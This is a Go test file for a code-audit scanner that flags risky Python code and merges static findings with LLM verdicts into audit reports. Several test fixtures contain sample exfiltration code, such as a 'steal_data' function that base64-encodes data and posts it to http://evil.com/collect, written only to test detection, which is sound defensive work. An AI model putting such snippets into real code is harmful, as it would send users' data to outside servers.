package codeaudit

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"testing"
	"time"
)

// ── GroupFindingsByFile tests ─────────────────────────────

func TestGroupFindingsByFile(t *testing.T) {
	findings := []Finding{
		{File: "/a/train.py", Line: 1, RuleID: "NET_001"},
		{File: "/a/train.py", Line: 5, RuleID: "CMD_001"},
		{File: "/b/utils.py", Line: 3, RuleID: "OBF_001"},
	}
	groups := GroupFindingsByFile(findings)
	if len(groups) != 2 {
		t.Fatalf("expected 2 file groups, got %d", len(groups))
	}
	if len(groups["/a/train.py"]) != 2 {
		t.Fatalf("expected 2 findings for train.py, got %d", len(groups["/a/train.py"]))
	}
	if len(groups["/b/utils.py"]) != 1 {
		t.Fatalf("expected 1 finding for utils.py, got %d", len(groups["/b/utils.py"]))
	}
}

func TestGroupFindingsByFileEmpty(t *testing.T) {
	groups := GroupFindingsByFile(nil)
	if len(groups) != 0 {
		t.Fatalf("expected 0 groups, got %d", len(groups))
	}
}

// ── BuildFileReport tests ────────────────────────────────

func TestBuildFileReport(t *testing.T) {
	findings := []Finding{
		{File: "/a/train.py", Line: 1, RuleID: "NET_001", Severity: SeverityHigh, CodeSnippet: "requests.post()"},
		{File: "/a/train.py", Line: 5, RuleID: "ENV_001", Severity: SeverityMedium, CodeSnippet: "os.getenv()"},
	}
	fr := BuildFileReport("/a/train.py", findings)

	if fr.File != "train.py" {
		t.Fatalf("file = %s, want train.py", fr.File)
	}
	if fr.FindingsCount != 2 {
		t.Fatalf("findings_count = %d, want 2", fr.FindingsCount)
	}
	if fr.HighCount != 1 {
		t.Fatalf("high_count = %d, want 1", fr.HighCount)
	}
	if fr.MediumCount != 1 {
		t.Fatalf("medium_count = %d, want 1", fr.MediumCount)
	}
	if fr.RiskLevel != "HIGH" {
		t.Fatalf("risk_level = %s, want HIGH", fr.RiskLevel)
	}
	if fr.Summary == "" {
		t.Fatal("summary should not be empty")
	}
}

// ── InferRiskLevel tests ─────────────────────────────────

func TestInferRiskLevel(t *testing.T) {
	tests := []struct {
		high, medium int
		want         string
	}{
		{3, 2, "HIGH"},
		{0, 5, "MEDIUM"},
		{0, 0, "LOW"},
		{1, 0, "HIGH"},
	}
	for _, tt := range tests {
		got := InferRiskLevel(tt.high, tt.medium)
		if got != tt.want {
			t.Errorf("InferRiskLevel(%d, %d) = %s, want %s", tt.high, tt.medium, got, tt.want)
		}
	}
}

// ── ComputeStatistics tests ──────────────────────────────

func TestComputeStatistics(t *testing.T) {
	findings := []Finding{
		{Severity: SeverityHigh, LLMVerdict: "MALICIOUS"},
		{Severity: SeverityHigh, LLMVerdict: "BENIGN"},
		{Severity: SeverityHigh, LLMVerdict: "SUSPICIOUS"},
		{Severity: SeverityMedium, LLMVerdict: "BENIGN"},
		{Severity: SeverityMedium, LLMVerdict: ""},
	}
	stats := ComputeStatistics(findings)

	if stats.TotalFindings != 5 {
		t.Fatalf("total = %d, want 5", stats.TotalFindings)
	}
	if stats.High != 3 {
		t.Fatalf("high = %d, want 3", stats.High)
	}
	if stats.Medium != 2 {
		t.Fatalf("medium = %d, want 2", stats.Medium)
	}
	if stats.Malicious != 1 {
		t.Fatalf("malicious = %d, want 1", stats.Malicious)
	}
	if stats.Suspicious != 1 {
		t.Fatalf("suspicious = %d, want 1", stats.Suspicious)
	}
	if stats.Benign != 2 {
		t.Fatalf("benign = %d, want 2", stats.Benign)
	}
}

// ── ComputeConclusion tests ──────────────────────────────

func TestComputeConclusionClean(t *testing.T) {
	stats := AuditStatistics{}
	conclusion := ComputeConclusion(stats, nil, "gate")
	if !conclusion.Passed {
		t.Fatal("clean code should pass")
	}
	if conclusion.RiskLevel != "NONE" {
		t.Fatalf("risk_level = %s, want NONE", conclusion.RiskLevel)
	}
}

func TestComputeConclusionCritical(t *testing.T) {
	stats := AuditStatistics{TotalFindings: 2, High: 2, Malicious: 1, Benign: 1}
	conclusion := ComputeConclusion(stats, nil, "gate")
	if conclusion.Passed {
		t.Fatal("malicious code should not pass")
	}
	if conclusion.RiskLevel != "CRITICAL" {
		t.Fatalf("risk_level = %s, want CRITICAL", conclusion.RiskLevel)
	}
}

func TestComputeConclusionGatePolicyDowngrade(t *testing.T) {
	// HIGH findings exist but all judged BENIGN by LLM
	stats := AuditStatistics{TotalFindings: 2, High: 2, Benign: 2}
	conclusion := ComputeConclusion(stats, nil, "gate")
	if !conclusion.Passed {
		t.Fatal("gate mode should pass when all HIGH are BENIGN")
	}
	if conclusion.RiskLevel != "MEDIUM" {
		t.Fatalf("risk_level = %s, want MEDIUM (downgraded HIGH)", conclusion.RiskLevel)
	}
}

func TestComputeConclusionAssistPolicy(t *testing.T) {
	// HIGH findings with LLM saying SUSPICIOUS — assist mode still blocks
	stats := AuditStatistics{TotalFindings: 1, High: 1, Suspicious: 1}
	conclusion := ComputeConclusion(stats, nil, "assist")
	if conclusion.Passed {
		t.Fatal("assist mode should not pass with HIGH+SUSPICIOUS")
	}
	if conclusion.RiskLevel != "HIGH" {
		t.Fatalf("risk_level = %s, want HIGH", conclusion.RiskLevel)
	}
}

func TestComputeConclusionAssistStaticOnlyBlocks(t *testing.T) {
	stats := AuditStatistics{TotalFindings: 1, High: 1}
	conclusion := ComputeConclusion(stats, nil, "assist")
	if conclusion.Passed {
		t.Fatal("assist mode should not pass with unresolved HIGH findings")
	}
	if conclusion.RiskLevel != "MEDIUM" {
		t.Fatalf("risk_level = %s, want MEDIUM", conclusion.RiskLevel)
	}
}

func TestComputeConclusionGateStaticOnlyBlocks(t *testing.T) {
	stats := AuditStatistics{TotalFindings: 2, High: 1, Medium: 1}
	conclusion := ComputeConclusion(stats, nil, "gate")
	if conclusion.Passed {
		t.Fatal("gate mode should block static findings when no LLM verdicts are present")
	}
	if conclusion.RiskLevel != "HIGH" {
		t.Fatalf("risk_level = %s, want HIGH", conclusion.RiskLevel)
	}
}

// ── BuildFindingsSummary tests ───────────────────────────

func TestBuildFindingsSummary(t *testing.T) {
	findings := []Finding{
		{RuleID: "NET_001", Category: "网络请求", Severity: SeverityHigh},
		{RuleID: "CMD_001", Category: "命令执行", Severity: SeverityHigh},
		{RuleID: "NET_001", Category: "网络请求", Severity: SeverityHigh}, // duplicate
	}
	summary := BuildFindingsSummary(findings)
	if summary == "" {
		t.Fatal("summary should not be empty")
	}
	// Should not contain duplicate NET_001.
	if containsSubstr(summary, "NET_001") && containsSubstr(summary, "CMD_001") {
		// good — both present
	} else {
		t.Fatalf("summary = %q, expected both NET_001 and CMD_001", summary)
	}
}

func TestBuildFindingsSummaryEmpty(t *testing.T) {
	summary := BuildFindingsSummary(nil)
	if summary != "无" {
		t.Fatalf("summary = %q, want 无", summary)
	}
}

// ── SuggestionForRule tests ──────────────────────────────

func TestSuggestionForRule(t *testing.T) {
	s := SuggestionForRule("NET_001")
	if s == "" {
		t.Fatal("NET_001 should have a suggestion")
	}
	s = SuggestionForRule("UNKNOWN_RULE")
	if s == "" {
		t.Fatal("unknown rule should have a default suggestion")
	}
}

// ── GenerateReportID tests ───────────────────────────────

func TestGenerateReportID(t *testing.T) {
	id1 := GenerateReportID()
	id2 := GenerateReportID()
	if id1 == id2 {
		t.Fatal("report IDs should be unique")
	}
	if len(id1) < 10 {
		t.Fatalf("report ID too short: %s", id1)
	}
}

// ── AssembleAuditReport tests ────────────────────────────

func TestAssembleAuditReport(t *testing.T) {
	scanReport := &Report{
		FilesCount: 3,
		HighCount:  1,
		Findings: []Finding{
			{File: "/a/train.py", Line: 1, RuleID: "NET_001", Severity: SeverityHigh, LLMVerdict: "MALICIOUS"},
		},
	}
	fileReports := []FileReport{
		{
			File: "train.py", FilePath: "/a/train.py",
			FindingsCount: 1, HighCount: 1, RiskLevel: "HIGH",
			Findings: scanReport.Findings,
		},
	}
	lineCounts := map[string]int{"/a/train.py": 50}
	cfg := LLMConfig{Model: "qwen2.5-coder:0.5b", Enabled: true, Policy: "gate"}

	audit := AssembleAuditReport("/a", scanReport, fileReports, lineCounts, cfg, 2*time.Second)

	if audit.ReportID == "" {
		t.Fatal("report_id should not be empty")
	}
	if audit.Target.FilesScanned != 3 {
		t.Fatalf("files_scanned = %d, want 3", audit.Target.FilesScanned)
	}
	if audit.Target.TotalLines != 50 {
		t.Fatalf("total_lines = %d, want 50", audit.Target.TotalLines)
	}
	if audit.Statistics.Malicious != 1 {
		t.Fatalf("malicious = %d, want 1", audit.Statistics.Malicious)
	}
	if audit.Conclusion.Passed {
		t.Fatal("should not pass with MALICIOUS finding")
	}
	if audit.Conclusion.RiskLevel != "CRITICAL" {
		t.Fatalf("risk_level = %s, want CRITICAL", audit.Conclusion.RiskLevel)
	}
	if audit.ScanMetadata.LLMModel != "qwen2.5-coder:0.5b" {
		t.Fatalf("llm_model = %s, want qwen2.5-coder:0.5b", audit.ScanMetadata.LLMModel)
	}
	if audit.ScanMetadata.ScanDurationMs != 2000 {
		t.Fatalf("scan_duration_ms = %d, want 2000", audit.ScanMetadata.ScanDurationMs)
	}
}

// ── GenerateAuditReport end-to-end tests ─────────────────

func TestGenerateAuditReportCleanCode(t *testing.T) {
	dir := t.TempDir()
	writeTestFile(t, dir, "train.py", `
import torch
import torch.nn as nn

class Model(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 2)
    def forward(self, x):
        return self.fc(x)
`)

	cfg := LLMConfig{Enabled: false}
	audit, err := GenerateAuditReport(context.Background(), dir, cfg, nil)
	if err != nil {
		t.Fatal(err)
	}
	if !audit.Conclusion.Passed {
		t.Fatal("clean code should pass audit")
	}
	if audit.Conclusion.RiskLevel != "NONE" {
		t.Fatalf("risk_level = %s, want NONE", audit.Conclusion.RiskLevel)
	}
	if len(audit.FileReports) != 0 {
		t.Fatalf("expected 0 file reports, got %d", len(audit.FileReports))
	}
	if audit.Statistics.TotalFindings != 0 {
		t.Fatalf("expected 0 findings, got %d", audit.Statistics.TotalFindings)
	}
}

func TestGenerateAuditReportMaliciousCode(t *testing.T) {
	dir := t.TempDir()
	writeTestFile(t, dir, "exfil.py", `
import requests
import base64

def steal_data(data):
    encoded = base64.b64encode(data)
    requests.post("http://evil.com/collect", json={"payload": encoded.decode()})
`)

	mock := &mockLLMClient{
		decisions: []LLMDecision{
			{Verdict: "MALICIOUS", Reason: "将数据编码后发送到外部服务器", Risk: "数据泄露"},
			{Verdict: "MALICIOUS", Reason: "使用 base64 编码隐藏数据", Risk: "隐写术"},
		},
		fileSummaries: []FileSummary{
			{RiskLevel: "HIGH", Summary: "存在数据外传行为", Chained: true, Exfiltration: true},
		},
	}

	cfg := LLMConfig{Enabled: true, Model: "test-model", Policy: "gate", MaxFindings: 10}
	audit, err := GenerateAuditReport(context.Background(), dir, cfg, mock)
	if err != nil {
		t.Fatal(err)
	}
	if audit.Conclusion.Passed {
		t.Fatal("malicious code should not pass audit")
	}
	if audit.Conclusion.RiskLevel != "CRITICAL" {
		t.Fatalf("risk_level = %s, want CRITICAL", audit.Conclusion.RiskLevel)
	}
	if audit.Statistics.Malicious < 1 {
		t.Fatalf("expected at least 1 MALICIOUS, got %d", audit.Statistics.Malicious)
	}
	if len(audit.FileReports) != 1 {
		t.Fatalf("expected 1 file report, got %d", len(audit.FileReports))
	}
	fr := audit.FileReports[0]
	if fr.File != "exfil.py" {
		t.Fatalf("file = %s, want exfil.py", fr.File)
	}
	if !fr.Chained {
		t.Fatal("chained should be true")
	}
	if !fr.HasExfiltrationPattern {
		t.Fatal("has_exfiltration_pattern should be true")
	}
}

func TestGenerateAuditReportLLMDisabled(t *testing.T) {
	dir := t.TempDir()
	writeTestFile(t, dir, "net.py", `
import requests
requests.post("http://example.com", json={"key": "value"})
`)

	cfg := LLMConfig{Enabled: false}
	audit, err := GenerateAuditReport(context.Background(), dir, cfg, nil)
	if err != nil {
		t.Fatal(err)
	}
	// Should still have findings from static scan.
	if audit.Statistics.TotalFindings == 0 {
		t.Fatal("expected findings from static scan")
	}
	// File report should have inferred risk level.
	if len(audit.FileReports) != 1 {
		t.Fatalf("expected 1 file report, got %d", len(audit.FileReports))
	}
	if audit.FileReports[0].RiskLevel != "HIGH" {
		t.Fatalf("risk_level = %s, want HIGH (inferred)", audit.FileReports[0].RiskLevel)
	}
}

func TestGenerateAuditReportMultiFile(t *testing.T) {
	dir := t.TempDir()
	writeTestFile(t, dir, "train.py", `
import torch
model = torch.nn.Linear(10, 2)
`)
	writeTestFile(t, dir, "utils.py", `
import os
key = os.getenv("API_KEY")
`)
	writeTestFile(t, dir, "exfil.py", `
import requests
requests.post("http://evil.com", data="stolen")
`)

	mock := &mockLLMClient{
		decisions: []LLMDecision{
			{Verdict: "MALICIOUS", Reason: "恶意网络请求", Risk: "数据外传"},
		},
		fileSummaries: []FileSummary{
			{RiskLevel: "HIGH", Summary: "恶意文件", Chained: false, Exfiltration: true},
		},
	}

	cfg := LLMConfig{Enabled: true, Model: "test-model", Policy: "gate", MaxFindings: 10}
	audit, err := GenerateAuditReport(context.Background(), dir, cfg, mock)
	if err != nil {
		t.Fatal(err)
	}
	if audit.Target.FilesScanned != 3 {
		t.Fatalf("files_scanned = %d, want 3", audit.Target.FilesScanned)
	}
	// Only files with findings should appear in file_reports.
	if len(audit.FileReports) < 1 {
		t.Fatal("expected at least 1 file report")
	}
}

func TestGenerateAuditReportEmptyDir(t *testing.T) {
	_, err := GenerateAuditReport(context.Background(), "", LLMConfig{}, nil)
	if err == nil {
		t.Fatal("expected error for empty dir")
	}
}

// ── ReadFileForAnalysis tests ────────────────────────────

func TestReadFileForAnalysis(t *testing.T) {
	dir := t.TempDir()
	content := "line1\nline2\nline3\nline4\nline5\n"
	path := writeTestFile(t, dir, "test.py", content)

	code := ReadFileForAnalysis(path, 3)
	if !containsSubstr(code, "line1") {
		t.Fatal("should contain line1")
	}
	if !containsSubstr(code, "line3") {
		t.Fatal("should contain line3")
	}
	if !containsSubstr(code, "截断") {
		t.Fatal("should contain truncation notice")
	}
}

func TestReadFileForAnalysisNonExistent(t *testing.T) {
	code := ReadFileForAnalysis("/nonexistent/file.py", 10)
	if !containsSubstr(code, "无法读取") {
		t.Fatal("should indicate file cannot be read")
	}
}

// ── CountFileLines tests ─────────────────────────────────

func TestCountFileLines(t *testing.T) {
	dir := t.TempDir()
	path := writeTestFile(t, dir, "test.py", "a\nb\nc\n")
	count := CountFileLines(path)
	if count < 3 {
		t.Fatalf("expected at least 3 lines, got %d", count)
	}
}

func TestCountFileLinesNonExistent(t *testing.T) {
	count := CountFileLines("/nonexistent/file.py")
	if count != 0 {
		t.Fatalf("expected 0 for nonexistent file, got %d", count)
	}
}

// ── ScanDirectoryWithLines tests ─────────────────────────

func TestScanDirectoryWithLines(t *testing.T) {
	dir := t.TempDir()
	writeTestFile(t, dir, "a.py", "import torch\nmodel = torch.nn.Linear(10, 2)\n")
	writeTestFile(t, dir, "b.py", "import requests\nrequests.post('http://evil.com')\n")

	scanner := NewDefaultScanner()
	report, lineCounts, err := scanner.ScanDirectoryWithLines(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.FilesCount != 2 {
		t.Fatalf("files_count = %d, want 2", report.FilesCount)
	}
	if len(lineCounts) != 2 {
		t.Fatalf("expected 2 line count entries, got %d", len(lineCounts))
	}
	for path, count := range lineCounts {
		if count < 2 {
			t.Fatalf("file %s has %d lines, expected >= 2", filepath.Base(path), count)
		}
	}
}

// ── JSON serialization test ──────────────────────────────

func TestAuditReportJSON(t *testing.T) {
	dir := t.TempDir()
	writeTestFile(t, dir, "train.py", `
import requests
requests.post("http://monitor.local/metrics", json={"acc": 0.95})
`)

	mock := &mockLLMClient{
		decisions: []LLMDecision{
			{Verdict: "BENIGN", Reason: "仅发送训练指标", Risk: ""},
		},
		fileSummaries: []FileSummary{
			{RiskLevel: "LOW", Summary: "正常的监控代码", Chained: false, Exfiltration: false},
		},
	}

	cfg := LLMConfig{Enabled: true, Model: "qwen2.5-coder:0.5b", Policy: "gate", MaxFindings: 10}
	audit, err := GenerateAuditReport(context.Background(), dir, cfg, mock)
	if err != nil {
		t.Fatal(err)
	}

	// Verify it serializes to valid JSON.
	data, err := json.MarshalIndent(audit, "", "  ")
	if err != nil {
		t.Fatalf("JSON marshal failed: %v", err)
	}
	if len(data) < 100 {
		t.Fatalf("JSON output suspiciously short: %d bytes", len(data))
	}

	// Write to temp file and verify it's valid JSON.
	tmpFile := filepath.Join(t.TempDir(), "audit_report.json")
	if err := os.WriteFile(tmpFile, data, 0o644); err != nil {
		t.Fatal(err)
	}
	t.Logf("Audit report written to: %s (%d bytes)", tmpFile, len(data))

	// Re-read and unmarshal to verify round-trip.
	readBack, err := os.ReadFile(tmpFile)
	if err != nil {
		t.Fatal(err)
	}
	var roundTrip AuditReport
	if err := json.Unmarshal(readBack, &roundTrip); err != nil {
		t.Fatalf("JSON round-trip failed: %v", err)
	}
	if roundTrip.ReportID != audit.ReportID {
		t.Fatal("report_id mismatch after round-trip")
	}
}
